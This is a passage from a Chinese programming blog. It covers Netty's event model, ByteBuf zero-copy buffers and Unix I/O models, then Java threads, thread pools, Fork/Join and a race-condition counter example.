ChannelHandler 事件模型 EventLoop EventLoop，即事件循环，一个 EventLoop 通常将处理多个 Channel 的事件，EventLoop 在它生命周期中只绑定单个线程，而 EventLoopGroup 包含一个或多个 EventLoop。\nEventLoop 类的族谱如下所示：\n由此可见，EventLoop 的本源是 Executor（请先阅读多线程·并发编程 # Java 多线程 # 线程池），那么 EventLoop 处理 Channel 的事件转换为执行（execute）相应的任务，\n任务的基本实现是 Runable，任务可能立即执行，也可能加入队列，取决于调用 execute 方法的线程是否是 EventLoop 绑定的线程。\n如下图所示，一个 NioEventLoopGroup 通常维护多个 NioEventLoop 。\n当一个 Channel 注册到一个 NioEventLoopGroup，根据上文所说的 Java NIO 知识，该 Channel 注册到一个由某个 NioEventLoop 维护的 Selector，因此，NioEventLoop 通常将处理多个 Channel 的事件。\nChannelPipeline 事件分为入站（inbound）事件和出站（outbound）事件。一个事件被 EventLoop 作为任务执行之前，它流经 ChannelPipeline 中已安装的一个或多个 ChannelHandler。\n每个 Channel 都有各自的 ChannelPipeline，新建 Channel 时自动创建，使用 ChannelPipeline 添加或删除 ChannelHandler 是线程安全的。ChannelPipeline 的子接口有 ChannelInboundHandler 和 ChannelOutboundHandler，分别用于 EventLoop 处理入站事件和出站事件。\nChannelPipeline 实现了 Intercepting Filter 模式的高级形式，所谓 Filter 模式，常常被认为属于责任链模式，比如 Servlet 的请求过滤器：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class CustomFilter implements Filter { public void doFilter( ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { // process the request // pass the request (i.e. the command) along the filter chain chain.doFilter(request, response); } } 一个 Filter 可以拦截请求，也可以转发请求给下一个 Filter。为了帮助理解，HandlerChain 演示了基于链表和多态的责任链模式。\n对于 DefaultChannelPipeline 来说，其链表通常有一个特别的头（HeadContext）和尾（TailContext），实际上结点是包装了 ChannelHandler 的 ChannelHandlerContext。ChannelHandlerContext 定义了事件传播方法（event propagation method），例如 ChannelHandlerContext.fireChannelRead(Object) 和 ChannelOutboundInvoker.write(Object)，事件在 ChannelPipeline 中流动。\n以 Channel 读就绪为例，它属于入站事件，输入的数据也在 ChannelPipeline 中流动。\n若以服务器端接受请求和发送响应为例，假设 RequestDecoder 和 BussinessHandler 都继承了 ChannelInboundHandlerAdapter，ResponseEncoder 继承了 ChannelOutboundHandlerAdapter。\n1 2 3 4 ChannelPipeline pipeline = channel.pipeline(); pipeline.addLast(new RequestDecoder()); pipeline.addLast(new ResponseEncoder()); pipeline.addLast(new BussinessHandler()); （1）接受请求。\n1 -\u0026gt; RequestDecoder（解码）-\u0026gt; ResponseEncoder（非触发）-\u0026gt; BussinessHandler（处理）-\u0026gt; （2）业务逻辑。\n假设处理完成后调用 ChannelOutboundInvoker.writeAndFlush(Object) 来写回复消息。\n（3）发送响应。\n1 -\u0026gt; BussinessHandler（写消息）-\u0026gt; ResponseEncoder（编码）-\u0026gt; RequestDecoder（非触发）-\u0026gt; 最小化内存复制 Netty 使用它自己的 buffer API 代替 Java NIO 的 ByteBuffer 来表示字节序列。Netty 新的缓冲区类型，名为 ByteBuf，它具有如下特性：\n您可以根据需要定义缓冲区类型。 透明的零复制是通过内置的聚合缓冲区类型实现的。 开箱即有，动态扩容。 不需要调用 flip() 了。 它通常比 ByteBuffer 快。 注意，上面的零复制并不是操作系统级零复制，操作系统级零复制是指 CPU 不执行将数据从一个存储区域复制到另一个存储区域的任务，详情见 zero-copy。如果 \u0008I/O 设备支持 DMA 的 scatter-gather 操作，那么 Java NIO 提供操作系统级零复制方法是 transferTo。\n聚合缓冲区类型是指 CompositeByteBuf。\n假设有两个字节数组，header 和 body，在模块化系统中，这两个字节数组可以由不同的模块生产，然后在消息发送后聚合。如果用 Java NIO 的 ByteBuffer 来聚合两个字节数组，一般人可能考虑新建一个缓冲区数组并持有两个字节数组，或者新建一个缓冲区并插入两个字节数组。\n1 2 // Use an array to composite them ByteBuffer[] message = new ByteBuffer[] { header, body }; 1 2 3 4 5 // Use copy to merge both ByteBuffer message2 = ByteBuffer.allocate(header.remaining() + body.remaining()); message.put(header); message.put(body); message.flip(); 以上两种方式不仅有内存复制的成本，而且第一种方式还引入了不兼容或复杂的缓冲区数组类型。\n1 2 3 4 5 6 // The composite type is incompatible with the component type. ByteBuf message = Unpooled.wrappedBuffer(header, body); // Therefore, you can even create a composite by mixing a composite and an // ordinary buffer. ByteBuf messageWithFooter = Unpooled.wrappedBuffer(message, footer); 如果使用 Netty 的 ByteBuf 实现，则内存复制次数几乎为零，因为缓冲区引用了两个或多个数组（指针）。\n1 2 3 4 CompositeByteBuf compBuf = Unpooled.compositeBuffer(); ByteBuf headerBuf = ...; // can be backing or direct ByteBuf bodyBuf = ...; // can be backing or direct compBuf.addComponent(headerBuf, bodyBuf); 同理，聚合两个缓冲区，使用指针而不是从原缓冲区复制。\n1 2 ByteBuf buf = Unpooled.copiedBuffer(\u0026#34;Hello, World!\u0026#34;, StandardCharsets.UTF_8); ByteBuf sliced = buf.slice(0, 14); 同理，缓冲区的切片，返回的切片引用了原缓冲区的子数组。\n为什么高性能 为什么 Netty 吞吐量更高、延迟更低、资源消耗更少？比如 RxNetty vs Tomcat 和 七种 WebSocket 框架的性能比较。\n使用 Java NIO 和 Reactor 模式。为什么 Java NIO 高效，上文的解释是“以阻塞时间换工作时间”，下文将补充操作系统层解释；为什么说 Netty 使用了 Reactor 模式，这里提供一个线索，Netty 中的 ServerBootstrap 的 group 方法有两个类型均为 EventLoopGroup 的参数，回想一下上文“Reactor 多线程版” 最后一张图。\nGC 优化。例如，使用缓冲区对象池，复用缓冲区对象减少了频繁新建对象和收集垃圾引起的延迟，且使用直接缓冲区，详情见 Netty 4 at Twitter: Reduced GC Overhead 和 PooledByteBufAllocator.java。\n减少不必要的内存复制。如上文所说。\n\u0026hellip;\u0026hellip;\n应用程序优化 S0 优化业务逻辑。\nS1 避免阻塞 bossGroup/parentGroup 和 workerGroup/childGroup 中的线程。执行耗时任务（如访问数据库），考虑新建给定线程数的 EventLoopGroup 对象，添加它和业务逻辑的 ChannelHandler 到 ChannelPipeline。\nS2 复用 ByteBuf 对象，减少 GC 引起的延迟。\nByteBuf is a reference-counted object which has to be released explicitly via the release() method. Please keep in mind that it is the handler\u0026rsquo;s responsibility to release any reference-counted object passed to the handler\nS2.1 使用 release()，回收对象后将隐式复用对象。\n1 2 3 4 5 @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { // Do something with msg ((ByteBuf) msg).release(); } 1 2 3 4 5 6 7 8 @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { try { // Do something with msg } finally { ReferenceCountUtil.release(msg); } } 1 2 3 4 5 6 @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { // Do something with msg ctx.write(msg); ctx.flush(); } It is because Netty releases it for you when it is written out to the wire.\nS2.2 继承 SimpleChannelInboundHandler。\nBe aware that depending of the constructor parameters it will release all handled messages by passing them to ReferenceCountUtil.release(Object). In this case you may need to use ReferenceCountUtil.retain(Object) if you pass the object to the next handler in the ChannelPipeline.\nS2.3 使用事件传播方法，转发给其它结点释放。\nA1 ChannelOption 配置或参数调优，例如调整 TCP 发送/接收缓冲区（TCP Send/Receive Buffers）的大小：\n1 2 3 4 5 6 7 ServerBootstrap bootstrap = new ServerBootstrap() .channel(EpollServerSocketChannel.class) .group(bossGroup, workerGroup) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new CustomChannelInitializer()) .childOption(ChannelOption.SO_SNDBUF, 1024 * 1024) .childOption(ChannelOption.SO_RCVBUF, 32 * 1024); A2 复用自定义的 ChannelHandler 对象。使用 @ChannelHandler.Sharable，但要注意是否存在多线程访问共享变量的安全问题。\nI/O 模型 经典的 《UNIX Network Programming》已经完美诠释了五种 I/O 模型。\nblocking I/O nonblocking I/O I/O multiplexing (select and poll and epoll) signal driven I/O (SIGIO) asynchronous I/O (the POSIX aio_ functions) 目前来说，signal driven I/O 和 asynchronous I/O 在 Linux 的应用较为罕见，因此本文只关注前三种。\n回想开头所说的 I/O 的本质，但别忘了操作系统是应用程序和硬件的中间层。\n输入是从 I/O 设备复制字节序列到内核缓冲区，然后从内核缓冲区复制字节序列到进程缓冲区。\n输出是从进程缓冲区复制字节序列到内核缓冲区，然后从内核缓冲区复制字节序列到 I/O 设备。\nblocking I/O \u0026amp; nonblocking I/O 以读 Socket 为例，线程调用 recvfrom 函数并传递目标 Socket 文件描述符，该线程被阻塞在该函数，当目标 Socket 读就绪，内核复制数据报，复制完成后该函数返回 OK，该线程退出该函数并执行后续语句。\n仍以读 Socket 为例，线程调用 recvfrom 函数并传递目标 Socket 文件描述符，该线程没被阻塞在该函数，该函数返回错误码，表示目标 Socket 非读就绪，线程重复调用该函数（轮询），当目标 Socket 读就绪，该线程被阻塞在该函数，内核复制数据报，复制完成后该函数返回 OK，该线程退出该函数并执行后续语句。\n注意，blocking I/O 模型和 nonblocking I/O 模型都出现了线程被阻塞在函数的现象。\n最后以先读 Socket 后写 Socket 为例，下面这张来自 Shawn Xu 的文章（文末有链接）的图详细描述了 Java BIO 的底层行为。\n注意，JVM 发起 2 次系统调用，内核执行 2 次数据复制。\nI/O multiplexing 继续以读 Socket 为例，线程在调用 recvfrom 函数前，先调用 select 函数并传递目标 Socket 文件描述符列表，该线程被阻塞在 select 函数，直到一个或多个目标 Socket 读就绪，内核对列表中可读的 Socket 文件描述符做了标记，然后 select 函数返回，线程执行循环语句遍历这个列表，查找已标记的 Socket 文件描述符，每命中一个 Socket 文件描述符就调用 recvfrom 函数并传递 Socket 文件描述符，该线程被阻塞在 recvfrom 函数，当目标 Socket 读就绪，内核复制数据报，复制完成后该函数返回 OK，该线程退出该函数并继续执行循环语句。select 函数的实现细节有明显可优化的地方，比如，内核只需回复一个只存储就绪的 Socket 文件描述符列表，可节省顺序查找的开销。\n虽然以上三种 I/O 模型均出现了线程被阻塞在函数的现象，但是 I/O multiplexing 模型的优势在于单一线程在相同时间内能够处理更多的连接或请求，同时组合多线程模型，例如 Reactor 模式，所以才说，一个基于 I/O multiplexing 的 Java NIO 服务器端应对负载增加的能力通常高于一个 Java BIO 服务器端。\n原生传输 早在 JDK 6 就已经包括了基于 Linux epoll 全新的 SelectorProvider，当检测到内核 2.6 以及更高版本时，默认使用基于 epoll 的实现，当检测到 2.6 之前的内核版本时，将使用基于 poll 的实现。\nNetty 则提供了特别的 JNI 传输，与基于 NIO 的传输相比，产生更少的垃圾，通常可以提高性能。\nNioEventLoopGroup → EpollEventLoopGroup NioEventLoop → EpollEventLoop NioServerSocketChannel → EpollServerSocketChannel NioSocketChannel → EpollSocketChannel 详情请见 Netty # Native transports。\n文中代码 已发布，请移步 network。\n本文首发于 https://h2cone.github.io\n更多经验 Scalable IO in Java - Doug Lea\nJava NIO trick and trap\nIt’s all about buffers: zero-copy, mmap and Java NIO\nBuild Your Own Netty — Reactor Pattern\nReactor pattern - Wikipedia\nEvent (computing) - Wikipedia\nNetty in Action # Chapter 7. EventLoop and threading model\nNetty in Action # Chapter 6. ChannelHandler and ChannelPipeline\nNetty in Action # Chapter 5. ByteBuf\nChain-of-responsibility pattern - Wikipedia\nChain of Responsibility Design Pattern in Java\nHigh Performance JVM Networking with Netty - Speaker Deck\nNetty # Wiki # Reference counted objects\nPrinciples to Handle Thousands of Connections in Java Using Netty\nOracle # Enhancements in Java I/O\nUNP # Chapter 6. I/O Multiplexing: The select and poll Functions\n6.2 I/O Models - MASTERRAGHU\n一文读懂高性能网络编程中的I/O模型\nselect、poll、epoll之间的区别总结[整理]\nJava Tutorials # Basic I/O\nJava Tutorials # Custom Networking\nVert.x # Guide\n","date":"2020-03-08T11:07:41+08:00","permalink":"https://h2cone.github.io/2020/03/08/network_nio/","title":"网络·NIO"},{"content":"进程与线程 现代的计算机系统提供了许多漂亮的抽象，如下图所示：\n其中，进程是对处理器、主存和 I/O 设备的抽象，换言之，进程是操作系统对一个正在运行的程序的一种抽象。操作系统上可以“同时”运行多个进程，已经对一边听歌一边写代码和接收消息的流畅不足为奇，之所以用双引号，因为这可能是一种假象。\n大多数计算机系统中，需要运行的进程数是多于可以运行它们的 CPU 个数的，那么所谓的”同时“运行，很有可能是模拟并发的假象；也就是说一个进程的指令和另一个进程的指令是被 CPU 交错执行的，而且 CPU 在进程间切换足够快，进程“暂停”和“恢复”的间隔也足够短，每个进程看上去像是连续运行。除非有多个 CPU 或多处理器的计算机系统，才能支持多进程并行，即处理器同时执行多个程序的指令。\n一个进程用完了操作系统分配给它的时间片，操作系统决定把控制权转移给新的进程，就会进行上下文切换（context switch），即保存当前进程的状态，恢复目标进程的状态，交接控制权。这种状态被称为上下文（context），比如程序计数器和寄存器的当前值以及主存的内容。\n一个进程可以存在多个控制流（control flow），它们被称为线程。如来自维基百科线程词条的插图所示：\n因为只有单处理器，所以这个进程的两个线程轮番运行在进程的上下文中（模拟并发）。操作系统不仅调度进程，教科书常说，线程是操作系统调度的最小单位。大多数计算机系统中，需要运行的线程数大于可以运行它们的 CPU 核数，从单线程进程推广到多线程进程的线程，一个线程时间到了，上下文切换，它被“暂停”了，轮到了另一个线程运行，稍后轮到它时又“恢复”了。\n多线程程序十分普遍。电脑和手机应用程序在用户界面渲染动画，同时在后台执行计算和网络请求。一个 Web 服务器一次处理数千个客户端的请求。多线程下载、多线程爬虫、多线程遍历文件树\u0026hellip;\u0026hellip;多线程成为越来越重要的模型，因为多线程程序有不少优点。\n多线程之间比多进程之间更容易共享数据和通信。同一个进程的多个线程共享进程的资源，比如进程的虚拟地址空间中的程序代码和程序处理的数据以及文件，对于同一进程的线程们来说，可执行代码只有一套，它们可以访问存储在堆 (Heap) 中的共享变量或全局变量，但是，栈（Stack）、包括程序计数器（Program Counter）在内的寄存器（Register）副本、线程本地存储（Thread Local Storage）都是线程私有的（如果有的话）。不仅如此，线程之间可以通过共享的代码、数据、文件进行通信，绝大部分情况下比进程间的通信更高效。\n多线程执行任务更多或更快。如果主线程阻塞在耗时任务，整个程序可能会卡顿或长时间无响应，解决办法之一便是新建一个工作线程专门执行这个耗时任务，而主线程则继续执行其它任务。例如，前面提到的手机 APP（特别是 Android APP），UI 线程被阻塞后很有可能无法正常人机交互了，用户体验极差。更进一步，单进程的多线程之间的协作有可能提高 client-server 系统的性能，譬如异步调用缩短了请求响应时间（也许总延迟几乎没变）。最重要的是，虽然一个传统的 CPU 只能交错执行一个进程的多个线程，但随着多核处理器和超线程（hyperthreading）的普及，面对多任务或大任务的执行，多线程程序的性能上限具有更高的天花板，因为减少了执行多个任务需要模拟并发的开销，还因为处理器可以并行运行多个线程。\n并发与并行 并发（Concurrency）和并行（Parallelism）这两个术语经常混淆，语义应当结合语境。\n如上图所示，假设有两个任务和两个线程，每个任务只能由一线程执行且用时分别是 t1 和 t2（t1 \u0026lt; t2），且线程都是同时启动，那么各个方式总执行时间可能如下表所示：\n方式 总执行时间 串行 t1 + t2 并行 t2 单处理器并发 t1 + t2 + 上下文切换总时间 由此可见，如果上下文切换的耗时可以忽略不计，单处理器并发不仅执行总时间近似于串行执行总时间，还有一个优点是同时执行两个任务的假象。并行的方式非常快，但也取决于最耗时的任务。\n在多处理器计算机系统中，多线程交错执行或并行执行都有可能出现，下文将”交错或并行“统称为”并发“。\nJava 多线程 Java 进程 任何 Java 应用程序都跑在操作系统之上，操作系统作为硬件和应用程序的中间层，隐藏了下层具体实现的复杂性，并给上层提供了简单或统一的接口。\n正在运行的 Java 程序就是 Java 虚拟机（JVM），而虚拟机是对整个操作系统的抽象，但对操作系统来说 JVM 仍然是进程。下面这张来自 JVM Internals 的图展示了 Java SE 7 虚拟机运行时的数据区域（Run-Time Data Areas）。图中的堆和栈类似于 Linux/Unix 操作系统进程的虚拟地址空间中的堆和栈，值得注意的是 Java 8 用元空间（Metaspace）代替了永久代（PermGen）。JVM 运行时的数据区域可分成两大类，一是 Java 线程共享区域，包括堆和方法区；二是 Java 线程私有区域，包括栈，详情请见 The Java Virtual Machine Specification, Java SE 8 Edition # 2.5. Run-Time Data Areas。\nJava SE 最常用的虚拟机是 Oracle/Sun 研发的 Java HotSpot VM。HotSpot 基本的线程模型是 Java 线程与原生线程（native thread）之间 1:1 的映射。线程通常在操作系统层实现或在应用程序层实现，前者的线程称为内核线程，后者的线程可能称为用户线程。内核（kernel）是操作系统代码常驻主存的部分，而所谓用户，就是应用程序和应用程序开发者。\n前文提到，充分利用多处理器能使多线程程序运行得更快。在操作系统层，消费多处理器的是内核线程，操作系统负责调度所有内核线程（原生线程）并派遣到任何可用的 CPU，因为 Java 线程与内核线程（原生线程）是一对一映射，所以充分利用多处理器能增强 Java 程序的性能。\n启动线程 对于 HotSpot VM 来说，Java 线程是 java.lang.Thread 的实例。Java 用户可以使用类继承 java.lang.Thread 来新建和启动 Java 线程：\n1 2 3 4 5 6 7 8 9 10 11 public class HelloThread extends Thread { @Override public void run() { System.out.println(\u0026#34;Hello from a thread\u0026#34;); } public static void main(String[] args) { new HelloThread().start(); } } 或者使用类实现 java.lang.Runnable 来新建和启动线程。\n1 2 3 4 5 6 7 8 9 10 11 public class HelloRunnable implements Runnable { @Override public void run() { System.out.println(\u0026#34;Hello from a thread\u0026#34;); } public static void main(String[] args) { new Thread(new HelloRunnable()).start(); } } Java 8 以上的用户也许更倾向于使用匿名内部类实现 java.lang.Runnable 或 Lambda 表达式简化以上代码，但都是通过调用 java.lang.Thread#start 方法来启动新线程，对应的原生线程（内核线程）在启动 Java 线程时创建，并在终止时回收。其中，run 方法是 Java 线程启动后执行的语句组，即人类要求它执行的任务，而 main 方法的语句是 Java 用户直接或间接通过命令行启动 JVM 后执行。\n如上图所示，即使运行一个简单的 \u0026ldquo;Hello World\u0026rdquo; 程序，也可能在 JVM 或操作系统创建十几个或更多线程。例如执行 main 方法的语句需要的主线程，主线程能启动子线程并执行后续语句，子线程也能启动其子线程并执行后续语句，而且还有其它由 HotSpot 为了内部目的而创建的线程，如 VM thread、Periodic task thread、GC threads、Compiler threads、Signal dispatcher thread。\n主线程终止，其它线程还会运行吗？\nThreadLocal 前面提到了线程有若干的私有区域，其中之一能在 java.lang.Thread 中找到数据结构。Thread 维护了一个类型为 java.lang.ThreadLocal.ThreadLocalMap 的字段，ThreadLocalMap 是一个定制化的 HashMap，key 的类型是 ThreadLocal，value 指代线程本地变量的值。\n1 2 3 4 5 6 7 8 9 10 11 public class TransactionId { private static final ThreadLocal\u0026lt;Long\u0026gt; tid = ThreadLocal.withInitial(() -\u0026gt; 0L); public static Long get() { return tid.get(); } public static void set(Long value) { tid.set(value); } } 如上所示，类型为 ThreadLocal 的字段初始化后，每个访问该字段（通过 get 或 set 方法）的线程访问的是各自 ThreadLocalMap 实例存储的 key/value，其中类型是 ThreadLocal 的 key 相等，但 value 不一定相等。\n线程状态 下面这个来自 Java 6 Thread States and Life Cycle 的状态机，很好地描述了 Java 线程状态和生命周期。\n翻阅 JDK 8 的 java.lang.Thread.State 可以确定，在给定的时间点，一个 Java 线程只能处于以下状态之一：\nNew。尚未启动的线程处于此状态。\nRunnable。Java 虚拟机中正在执行的线程处于此状态。\nBlocked。等待获得监视器锁（monitor lock）而被阻塞的线程处于此状态。\nWaitting。无限期地等待另一个线程执行特定操作的线程处于此状态。\nTimed Waiting。有限期地等待另一个线程执行特定操作的线程处于此状态。\nTerminated。终止的线程处于此状态。\n如状态机所示，当线程执行不同操作时，线程状态发生转换，这些操作对应于 JDK 已提供的方法。注意上图的 o 表示 Object，t 表示 Thread。\n通知 wait/notify 一个线程处于等待状态时，可以被另外一个线程通知，转为可运行状态。比如，一个线程用一个对象（的引用）调用 Object#wait()，另一个线程用同一个对象（的引用）调用 Object#notify() 或 Object#notifyAll()，前提是它们必须拥有该对象的内置锁；第一个线程调用 Object#wait() 时，它会释放该对象的内置锁并“暂停”，第二个线程获得该对象的内置锁成功之后，调用 Object#notifyAll() 通知所有曾经用同一个对象（的引用）调用了 Object#wait() 的线程有重要事情发生；在第二个线程释放了该对象的内置锁后的某个时刻，第一个线程重新获得了该对象的内置锁，并从 Object#wait() 返回而“恢复”。阻塞状态与内置锁或监视器锁息息相关，将在下文的\u0026quot;锁和同步\u0026quot;讨论。\n详情请见 Object。\ninterrupt 另外，线程有一个中断状态（interrupt status）。所谓中断，即停止正在执行的操作，并执行其它操作。例如，主线程可使用子线程对象（的引用）调用 java.lang.Thread#interrupt() 中断子线程，子线程能够捕获 java.lang.InterruptedException 或调用 java.lang.Thread#interrupted() 接收到中断。\n详情请见 Thread。\npark/unpark 类比申请许可和提供许可。相比于 wait/notify，park/unpark 对调用顺序没有要求。线程调用 LockSupport#park() 时“暂停”，线程调用 LockSupport#unpark(Thread) 时取消给定线程的“暂停”，如果给定线程已“暂停”，则给定线程从 LockSupport#park() 返回而“恢复”，如果给定线程没有“暂停”，那么将来给定线程第一次调用 LockSupport#park() 时立即返回。\n详情请见 LockSupport。\nspurious wakeup 中断和虚假唤醒可能发生，官方建议在循环体内使用 wait 和 park，如下所示：\n1 2 3 4 5 6 synchronized (obj) { while (\u0026lt;condition does not hold\u0026gt;) { obj.wait(); } ... // Perform action appropriate to condition } 或者：\n1 2 3 4 5 6 7 while (waiters.peek() != current || !locked.compareAndSet(false, true)) { LockSupport.park(this); // ignore interrupts while waiting if (Thread.interrupted()) { wasInterrupted = true; } } 线程池 使用 Thread.start(...) 启动线程足以执行基本的任务，但是对于复杂任务，例如有返回值的任务和定时任务等，其 API 过于低级。大规模的应用程序中，将线程的创建和管理从应用程序其余部分分开是很有意义的，理由之一是分离关注点能够减弱复杂性。封装了线程的创建和管理的对象们称为 Executors。JDK 的 java.util.concurrent 包定义了三代 Executor 接口：\nExecutor\nExecutorService\nScheduledExecutorService\n如果 r 是 Runnable 对象，而 e 是 Executor 对象，则可以使用\n1 e.execute(r); 代替\n1 new Thread(r).start(); Executor 接口大部分实现都使用线程池（Thread Pool），这就是理由之二。例如，一个一般的服务器端程序服务着多个客户端，如果每个客户端的请求都通过新建一个线程来处理，即线程数随着请求数增加而增加，虽然新建线程比新建进程便宜，但是当活跃的线程数太多时，不仅占用大量的内存，容易导致内存溢出，而且操作系统内核需要花费大量的时间在线程调度上（上下文切换），大量的线程“暂停”较长时间，还因频繁新建和终结执行短时任务的线程而引起的延迟，大量客户端长时间得不到响应。\n对于 Java Hotspot VM 来说，大量线程的另一个问题是巨大的根集合（root set），因此 GC 停顿阶段（stop-the-world pause）更长。\n线程池由数量可控的工作线程（worker thread） 组成，每个工作线程的生命都被延长，以便用于执行多个任务，既减少了上下文切换引起的延迟，也减少了频繁新建和终结执行短暂任务的线程而引起的延迟。线程池的新建通常是预处理，即服务器端程序提供服务之前已准备好线程池，避免了临时新建大量线程的开销。\n线程池有一种类型是固定线程池（fixed thread pool），如果某个线程仍在使用中而被某种方式终止，那么就会有新的线程代替它。任务通过队列提交到池中，任务队列可以容纳超过线程池中线程数量的的任务。这样设计的好处是优雅降级（degrade gracefully）和削峰。\n1 2 3 public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;()); } 上面是 Executors 的新建固定线程池的简单方法。注意当中的参数类型，LinkedBlockingQueue，它是 BlockingQueue 的基于链表的实现类，作为阻塞队列，它有一个特性，当队列为空时，线程从队列拉取元素会被阻塞或被迫等待。仔细翻阅源码，可以知道线程池的预先新建和工作线程的生命延长是通过阻塞工作线程或使之有限期等待来实现。除此之外，任务队列的的任务抽象为 Runable。\n新建线程池返回一个 ExecutorService 实例，利用它来提交任务：\n1 2 3 Future\u0026lt;?\u0026gt; future = executorService.submit(() -\u0026gt; { // do something }); submit 方法可传递 Runable 引用或 Callable 引用，两者的关系如下：\n1 Runnable runnable = new FutureTask\u0026lt;\u0026gt;(callable); Future 表示异步结果。主线程调用 Future#get 方法时被迫等待，直到子线程完成相应的任务后，主线程从 Future#get 方法返回得到结果并执行后续语句。\nCompletableFuture 实现了 Future，并且支持设置回调方法。主线程无需等待工作线程完成相应的任务，当工作线程完成相应的任务后，回调方法会被调用。\n1 2 3 4 5 6 7 8 9 10 11 CompletableFuture\u0026lt;Object\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { // do something }, threadPoolExecutor); future.thenCompose(obj -\u0026gt; CompletableFuture.supplyAsync(() -\u0026gt; { // do other things }), threadPoolExecutor); future.whenComplete((obj, e) -\u0026gt; { // callback }, threadPoolExecutor); 设想一下多线程并发处理事件，要求主线程等待所有任务完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 List\u0026lt;CompletableFuture\u0026lt;Event\u0026gt;\u0026gt; futures = new ArrayList\u0026lt;\u0026gt;(events.size()); for (Event event : events) { CompletableFuture\u0026lt;Event\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { // handle event return event; }, threadPoolExecutor); futures.add(future); } CompletableFuture\u0026lt;Void\u0026gt; allFuture = CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])); try { allFuture.join(); } catch (Exception e) { // ... } 使用 Executors 新建线程池，需要注意的是，可能会因为任务队列堆积过多任务从而导致内存溢出，因为 LinkedBlockingQueue 可自动扩容，最大值为 Integer.MAX_VALUE。建议合理设置线程池的各个参数，例如使用构造器新建线程池：\n1 new ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue\u0026lt;Runnable\u0026gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler); 提交任务后，可能的情况如下所示：\n详情见 ThreadPoolExecutor 和 ScheduledThreadPoolExecutor。\nFork/Join Fork/Join 框架是 ExecutorService 接口的实现，它是为了可以分而治之的任务或工作而设计的，目标是使用所有可用的处理器来提高应用程序的性能。Fork/Join 框架分配任务给线程池中的工作线程，但是与一般的线程池不一样，它使用工作窃取算法，空闲的工作线程可以窃取繁忙的工作线程的任务来执行，这个线程池称为 ForkJoinPool。\n工作线程很有可能会被 BOSS 命令按以下套路工作：\n1 2 3 4 5 if 我的工作量足够小 直接做工作 else 将我的工作分为两个片段 调用两个片段并等待结果 分而治之，通常把一个足够大的工作任务递归分解为两个或多个相同或相似的子任务。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class BigTask extends RecursiveAction { private long[] src; private int start, len; // ... public BigTask(long[] src, int start, int len) { this.src = src; this.start = start; this.len = len; } protected static int threshold = 1000; @Override protected void compute() { if (len \u0026lt; threshold) { // 直接操作 src } else { int split = len / 2; invokeAll(new BigTask(src, start, split), new BigTask(src, start + split, len - split)); // ... } } } 假设这个大任务（BigTask）是对一个很长的数组（src）进行某些操作，例如排序、map、reduce、过滤、分组等。其中 BigTask 继承了 RecursiveAction，重写了 compute 方法。然后，新建一个线程池，命令工作线程执行大任务。\n1 2 3 4 5 long[] src = ...; BigTask task = new BigTask(src, 0, src.length); ForkJoinPool pool = new ForkJoinPool(); pool.invoke(task); 一个工作线程调用了 compute 方法，先判断当前 src 的长度是否小于阈值（threshold），若是则认为这个任务足够小，单线程很快就能完成对 src 的操作，否者就认为这个任务足够大，需要分工，于是先把 src 分成两个片段，然后调用 invokeAll 方法，其它工作线程去执行这两个子任务，又调用了 compute 方法\u0026hellip;\u0026hellip;在多处理器计算机系统中，因为支持多线程并行，所以这类程序通常运行得很快。\n如果需要返回值，则可以使用 RecursiveTask。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class FibonacciTask extends RecursiveTask\u0026lt;Integer\u0026gt; { private int n; public FibonacciTask(int n) { this.n = n; } @Override protected Integer compute() { if (n \u0026lt;= 1) { return n; } FibonacciTask f1 = new FibonacciTask(n - 1); f1.fork(); FibonacciTask f2 = new FibonacciTask(n - 2); return f2.compute() + f1.join(); } public static void main(String[] args) throws ExecutionException, InterruptedException { ForkJoinPool pool = new ForkJoinPool (Runtime.getRuntime().availableProcessors(), ForkJoinPool.defaultForkJoinWorkerThreadFactory, null, true); ForkJoinTask\u0026lt;Integer\u0026gt; task = pool.submit(new FibonacciTask(10)); Integer result = task.get(); } } 先分解，后合并。\nJDK 的 java.util.Arrays 和 java.util.streams 提供了许多操作聚合类型实例的并行化方法，这些方法通常基于 Fork/Join。\n非线程安全 前面说到了多线程程序的优点，但它也有明显的缺点。因为多个线程并发执行，且多个线程共享同一份只读代码，当多个线程并发读写共享变量或全局变量时，可能出现线程干扰（thread interference）和内存一致性错误（memory consistency errors），从而无法保证程序功能正确，也称为线程不安全。\n1 2 3 4 5 6 7 8 9 10 11 public class Counter { private long count; public void increment() { count++; } public long value() { return count; } } 上面是一个简单的计数器（Counter），其中有一个将计数器的值（count）增加 1 的方法（increment）。从人脑的角度，increment 方法可分解为三个步骤：\n读取 count 的值。 计算 count + 1。 把计算结果写回 count。 从计算机处理器的角度：\n从主存复制 count 的值和 1 的值到两个寄存器，以覆盖寄存器原来的值。 把两个寄存器的值复制到 ALU，ALU 对这两个值做算术运算。 ALU 将运算结果存入一个寄存器，以覆盖该寄存器原来的值。 假设两个线程读取了 count 的值为 0，两个线程都在计算 0 + 1，一个线程比另一个线程更快把计算结果写回 count，此时 count 的值为 1，较慢的线程把 1 写回了 count，最终 count 的值是错误的 1，而不是正确的 2。在转账场景下，相互覆盖或丢失更改是一个非常严重的错误，例如两个人同时对一个银行账户进行取款或存款，如果银行软件系统开发者仍然有线程惯性，那么结果可能取多了金额或存少了金额。\n线程 1 线程 2 整数值 0 读取 \u0026lt;- 0 读取 \u0026lt;- 0 增加 0 增加 0 写回 -\u0026gt; 1 写回 -\u0026gt; 1 下面通过 Junit 测试，来证实线程不安全的存在。\n1 2 3 4 5 6 7 8 9 10 